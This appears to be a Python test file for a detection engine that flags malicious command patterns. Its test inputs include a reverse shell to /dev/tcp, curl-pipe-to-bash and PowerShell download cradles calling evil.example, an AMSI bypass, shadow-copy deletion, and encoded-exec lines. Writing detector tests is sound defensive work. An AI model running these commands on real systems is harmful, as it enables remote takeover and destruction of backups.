"""
DKP · Foundation tests (Phase B.2 · 2026-02-16)
"""
import pytest
from services.die.api import analyze
from services.die.dkp import (
    load_patterns, pattern_by_id, match, SEED_PATTERNS,
    Pattern, Signature,
)


# ── registry loads ────────────────────────────────────────────────
def test_seed_registry_nonempty():
    patterns = load_patterns()
    assert len(patterns) >= len(SEED_PATTERNS)

def test_pattern_by_id_roundtrip():
    p = pattern_by_id("dkp.shadow_copy_removal")
    assert p is not None
    assert "T1490" in p.mitre
    assert "Ryuk" in p.families or "Ryuk" in p.malware_uses

def test_pattern_by_id_unknown():
    assert pattern_by_id("does.not.exist") is None


# ── shadow-copy removal fires cleanly ────────────────────────────
def test_shadow_copy_removal_matches():
    env = analyze("vssadmin delete shadows /all /quiet & wbadmin delete catalog -quiet")
    ids = {m["id"] for m in env["dkp_matches"]}
    assert "dkp.shadow_copy_removal" in ids
    m = next(m for m in env["dkp_matches"] if m["id"] == "dkp.shadow_copy_removal")
    assert m["confidence"] >= 0.5
    assert m["evidence"]                       # non-empty
    assert "T1490" in m["mitre"]


# ── PS download-cradle fires cleanly ─────────────────────────────
def test_ps_download_cradle_matches():
    env = analyze(
        "IEX((New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1'))")
    ids = {m["id"] for m in env["dkp_matches"]}
    assert "dkp.ps_download_cradle" in ids


# ── encoded PS pattern fires ─────────────────────────────────────
def test_ps_encoded_command_matches():
    env = analyze(
        "powershell.exe -NoP -EncodedCommand aQBlAHgAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAKQApAA==")
    ids = {m["id"] for m in env["dkp_matches"]}
    assert "dkp.ps_encoded_command" in ids


# ── AMSI bypass fires ────────────────────────────────────────────
def test_amsi_bypass_matches():
    env = analyze(
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed')")
    ids = {m["id"] for m in env["dkp_matches"]}
    assert "dkp.amsi_bypass" in ids


# ── JS ActiveX RCE pattern fires ─────────────────────────────────
def test_js_activex_rce_matches():
    env = analyze("var s = new ActiveXObject('WScript.Shell'); s.Run('cmd /c calc')")
    ids = {m["id"] for m in env["dkp_matches"]}
    assert "dkp.js_activex_rce" in ids


# ── VBScript shell run ───────────────────────────────────────────
def test_vbs_shell_run_matches():
    src = ('Dim x\nSet x = CreateObject("WScript.Shell")\n'
           'x.Run "cmd /c calc", 0, False\nEnd Sub')
    env = analyze(src)
    ids = {m["id"] for m in env["dkp_matches"]}
    assert "dkp.vbs_shell_run" in ids


# ── Bash reverse shell ───────────────────────────────────────────
def test_bash_reverse_shell_matches():
    env = analyze("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
    ids = {m["id"] for m in env["dkp_matches"]}
    assert "dkp.bash_reverse_shell" in ids


# ── curl-pipe-shell dropper ──────────────────────────────────────
def test_curl_pipe_shell_matches():
    env = analyze("curl -sL http://evil.example/a | bash")
    ids = {m["id"] for m in env["dkp_matches"]}
    assert "dkp.curl_pipe_shell" in ids


# ── python encoded exec ──────────────────────────────────────────
def test_python_exec_encoded_matches():
    src = ("import base64\n"
           "exec(base64.b64decode('cHJpbnQoJ2hlbGxvJyk=').decode())")
    env = analyze(src)
    ids = {m["id"] for m in env["dkp_matches"]}
    assert "dkp.python_exec_encoded" in ids


# ── deterministic ordering ───────────────────────────────────────
def test_match_deterministic():
    src = "vssadmin delete shadows /all /quiet"
    a = analyze(src)["dkp_matches"]
    b = analyze(src)["dkp_matches"]
    assert a == b
    # sorted by confidence desc, id asc
    confs = [m["confidence"] for m in a]
    assert confs == sorted(confs, reverse=True)


# ── benign input yields no matches ───────────────────────────────
def test_benign_no_matches():
    env = analyze("Get-Process | Where-Object {$_.CPU -gt 100}")
    ids = {m["id"] for m in env["dkp_matches"]}
    # Only weak signals — shadow-delete / cradle etc. should NOT fire.
    assert "dkp.shadow_copy_removal" not in ids
    assert "dkp.ps_download_cradle"  not in ids


# ── runtime add_pattern ──────────────────────────────────────────
def test_add_pattern_runtime():
    from services.die.dkp import add_pattern
    pat = Pattern(
        id="dkp.test.echo_marker",
        name="Echo marker test",
        intent="Test only",
        signatures=[Signature(kind="regex", pattern=r"DKP_UNIT_TEST_MARKER", weight=1)],
        mitre=[],
        confidence=90,
    )
    add_pattern(pat)
    env = analyze("some benign input with DKP_UNIT_TEST_MARKER embedded")
    ids = {m["id"] for m in env["dkp_matches"]}
    assert "dkp.test.echo_marker" in ids


# ── envelope shape ───────────────────────────────────────────────
def test_matched_pattern_dict_shape():
    env = analyze("vssadmin delete shadows /all /quiet")
    m = env["dkp_matches"][0]
    for key in ("id","name","intent","mitre","confidence",
                "narrative_template","evidence","matched_signatures"):
        assert key in m
